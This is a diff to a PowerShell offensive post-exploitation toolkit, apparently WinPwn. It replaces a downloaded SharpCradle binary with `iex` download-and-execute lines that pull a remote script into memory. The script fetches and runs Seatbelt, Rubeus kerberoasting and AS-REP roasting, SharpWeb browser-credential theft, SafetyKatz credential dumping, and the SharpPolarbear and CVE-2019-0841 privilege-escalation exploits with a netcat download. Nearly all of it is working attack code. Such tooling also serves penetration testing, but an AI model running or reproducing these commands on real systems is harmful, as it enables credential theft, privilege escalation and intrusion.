@@ -105,122 +105,156 @@ function sharpcradle{
     (
         [bool]
         $allthosedotnet,
-	[bool]
-        $polar
+	    [bool]
+        $polar,
+        [string]
+        $url,
+        [string]
+        $argument1,
+        [string]
+        $argument2,
+        [string]
+        $argument3
     )
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     if ($allthosedotnet)
     {
-    	    if ([Environment]::Is64BitProcess)
-    	    {
-       		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-       		}
-    	    else
-    	    {
-       		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle2.exe?raw=true -Outfile $currentPath\cradle.exe
-       		}
+    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')    
         Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all >> $currentPath\LocalRecon\SeatBeltOutput.txt
+		Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe -argument1 all >> $currentPath\LocalRecon\SeatBeltOutput.txt
 		Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe asreproast /format:hashcat >> $currentPath\Exploitation\ASreproasting.txt
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe kerberoast /format:hashcat >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+		Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 asreproast -argument2 "/format:hashcat" >> $currentPath\Exploitation\ASreproasting.txt
+		Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe -argument1 kerberoast -argument2 "/format:hashcat" >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
 		Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+		Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
 		Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe all >> $currentPath\Exploitation\Browsercredentials.txt
+		Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe -argument1 all >> $currentPath\Exploitation\Browsercredentials.txt
 		Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt	
+		Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt	
 		if (isadmin)
 		{
 			Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe audit >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
+			Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe -argument1 audit >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
 			Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt
+			Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt
 		}
         If((Get-Content .\Vulnerabilities\Privilege_Escalation_Vulns.txt) -match "CVE-2019-0841 : VULNERABLE")
         {
             if(!(Test-Path -Path C:\temp\)){mkdir C:\temp}
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/nc.exe -Outfile C:\temp\nc.exe
-            .\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/privesc.exe license.rtf
+            Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/privesc.exe -argument1 license.rtf
+            Start-Sleep -Seconds 3
             cmd /c start powershell -Command {C:\temp\nc.exe 127.0.0.1 2000}
 
         }
-		del .\cradle.exe
+		
 	    
     }
     if ($polar)
     {
-    	if ([Environment]::Is64BitProcess)
-    	{
-       	    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       	    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-       	}
-    	else
-    	{
-       	    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       	    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle2.exe?raw=true -Outfile $currentPath\cradle.exe
-       	}
+    	iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
     	$polaraction = Read-Host -Prompt 'Do you have a valid username and password to elevate privileges?'
-	if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
-	{
-		$username = Read-Host -Prompt 'Please enter the username'
-		$password = Read-Host -Prompt 'Please enter the password'
-		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
-		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
-		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
+	    if ($polaraction -eq "yes" -or $polaraction -eq "y" -or $polaraction -eq "Yes" -or $polaraction -eq "Y")
+	    {
+		    $username = Read-Host -Prompt 'Please enter the username'
+		    $password = Read-Host -Prompt 'Please enter the password'
+		    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schedsvc.dll -Outfile $currentPath\schedsvc.dll
+		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/schtasks.exe -Outfile $currentPath\schtasks.exe
+		    Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/test.job -Outfile $currentPath\test.job
 		
-		if ([Environment]::Is64BitProcess)
-		{
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe license.rtf $username $password
-			Start-Sleep -Seconds 1.5
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe license.rtf $username $password
-		}
-		else
-		{
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe license.rtf $username $password
-			Start-Sleep -Seconds 1.5
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe license.rtf $username $password
-		}
+		    if ([Environment]::Is64BitProcess)
+		    {
+			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
+			    Start-Sleep -Seconds 1.5
+			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbear.exe -argument1 license.rtf $username $password
+		    }
+		    else
+		    {
+			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
+			    Start-Sleep -Seconds 1.5
+			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe -argument1 license.rtf $username $password
+		    }
 		
-		<#$system = Read-Host -Prompt 'Did you get a system shell? (y/n)'
-		if ($system -eq "no" -or $system -eq "n" -or $system -eq "No" -or $system -eq "N")
-		{
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe license.rtf 2
-			Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
-			Start-Sleep -Seconds 15
-			Write-Host 'Next Try..'
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe license.rtf 2
-			Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
-			Start-Sleep -Seconds 15
-		}#>
-		move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
-		del .\cradle.exe
-		del .\schedsvc.dll
-		del .\schtasks.exe
-		del C:\windows\system32\tasks\test
-	}
-    }
-    elseif ([Environment]::Is64BitProcess)
-    {
-       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
+		    <#$system = Read-Host -Prompt 'Did you get a system shell? (y/n)'
+		    if ($system -eq "no" -or $system -eq "n" -or $system -eq "No" -or $system -eq "N")
+		    {
+			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
+			    Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
+			    Start-Sleep -Seconds 15
+			    Write-Host 'Next Try..'
+			    Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe -argument1 "license.rtf 2"
+			    Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
+			    Start-Sleep -Seconds 15
+		    }#>
+		    move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
+		    del .\schedsvc.dll
+		    del .\schtasks.exe
+		    del C:\windows\system32\tasks\test
+	    }
     }
     else
-    {
-       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-       Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle2.exe?raw=true -Outfile $currentPath\cradle.exe
-    }
-    if(Test-Path -Path $currentPath\cradle.exe)
-    {
-    	$url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe:'
-    	$arguments = Read-Host -Prompt 'Enter arguments for the executable file:'
-    	.\cradle.exe -w $url $arguments
-    	del .\cradle.exe
+    {    
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+     	if ($url)
+        {
+            if ($argument1)
+            {
+                if ($argument2)
+                {
+                    if($argument3)
+                    {
+                        Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2 -argument3 $argument3
+                    }
+                    else{Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2}
+                }
+                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
+            }
+            else
+            {
+                $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
+	            if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
+                {
+                    $argument1 = Read-Host -Prompt 'Enter argument1 for the executable file:'
+                    $arg1 = Read-Host -Prompt 'Do you need more arguments for the executable?'
+	                if ($arg1 -eq "yes" -or $arg1 -eq "y" -or $arg1 -eq "Yes" -or $arg1 -eq "Y")
+                    {
+                        $argument2 = Read-Host -Prompt 'Enter argument2 for the executable file:'
+                        Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2
+                    }
+                    else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
+                }
+                else
+                {
+                    Invoke-Sharpcradle -Uri $url
+                }
+            }
+         
+        }
+        else
+        {
+            $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe'
+    	    $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
+	        if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
+            {
+                $argument1 = Read-Host -Prompt 'Enter argument1 for the executable file:'
+                $arg1 = Read-Host -Prompt 'Do you need more arguments for the executable?'
+	            if ($arg1 -eq "yes" -or $arg1 -eq "y" -or $arg1 -eq "Yes" -or $arg1 -eq "Y")
+                {
+                    $argument2 = Read-Host -Prompt 'Enter argument2 for the executable file:'
+                    Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2
+                }
+                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
+             
+            }
+            else
+            {
+                Invoke-Sharpcradle -Uri $url
+            }
+        }
+            	
     }
 }
 
@@ -374,19 +408,9 @@ function kittielocal
             if ($safety -eq "yes" -or $safety -eq "y" -or $safety -eq "Yes" -or $safety -eq "Y")
             {
                 Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
-                if ([Environment]::Is64BitProcess)
-                {
-                   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-		   Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-		   .\cradle.exe -w https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
-		   del .\cradle.exe
-                }
-                else
-                {
-                   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-		   Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle2.exe?raw=true -Outfile $currentPath\cradle.exe
-		   .\cradle.exe -w https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
-                   del .\cradle.exe
+                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+		        Invoke-Sharpcradle -uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+		   
 		}
             }
             else
